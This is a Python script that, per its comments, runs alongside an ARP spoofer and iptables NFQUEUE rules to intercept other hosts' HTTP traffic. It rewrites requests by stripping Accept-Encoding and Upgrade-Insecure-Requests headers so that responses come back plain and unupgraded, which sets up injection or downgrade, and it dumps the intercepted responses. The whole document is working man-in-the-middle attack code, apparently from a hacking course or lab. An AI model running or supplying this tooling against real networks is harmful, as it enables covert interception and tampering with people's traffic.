#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from scapy.layers import http #you need to pip install scapy_http 
import re
import os

#if tested on a real network:
#   -launch arp spoofer
#   -set iptables as follow: iptables -i forward -j nfqueue --queue-num 0
#   -lauch this script
#
#once you are done, flush the iptables: iptables --flush

#set the iptables as follow to test on local machine test on local machine
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet    

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(http.HTTPRequest) \
            and scapy_packet[scapy.TCP].dport == 80: 

        print("[+] Request")
        headers = scapy_packet[http.HTTPRequest].Headers
        #add_headers = scapy_packet[http.HTTPRequest].Additional-Headers
        if "Accept-Encoding" in scapy_packet[http.HTTPRequest].Headers:
            print("Packet encoding request detected!")
            headers = re.sub("Accept-Encoding.*?\\r\\n","", headers)
            #headers = re.sub("Accept-Encoding.*?\\r\\n","", scapy_packet[http.HTTPRequest].Headers)
        if "Upgrade-Insecure-Requests" in scapy_packet[http.HTTPRequest].Headers:
            print("Packet upgrade request detected!")
            headers = re.sub("Upgrade-Insecure-Requests:\s.","", headers)

        #scapy_packet[http.HTTPRequest].Http-Version = 'HTTP/1.0'
        scapy_packet[http.HTTPRequest].Headers = headers
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.TCP].chksum
        packet.set_payload(str(scapy_packet)) 

        scapy_packet.show()
        #input('Press a key to continue!')

    if scapy_packet.haslayer(http.HTTPResponse) \
            and scapy_packet[scapy.TCP].sport == 80 \
            and scapy_packet.haslayer(scapy.Raw): 

        print("[+] Response!")
        scapy_packet.show()

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

##Test on full automatic script
#print("Setting iptables for queuing")
#os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
#os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
#print("1")
#while True:
#    try:
#        queue = netfilterqueue.NetfilterQueue()
#        queue.bind(0, process_packet)
#        queue.run()
#    except KeyboardInterrupt:
#        print("CTRL + C detected... Resetting iptables")
#        os.system("iptables --flush")
#        #exit(0)


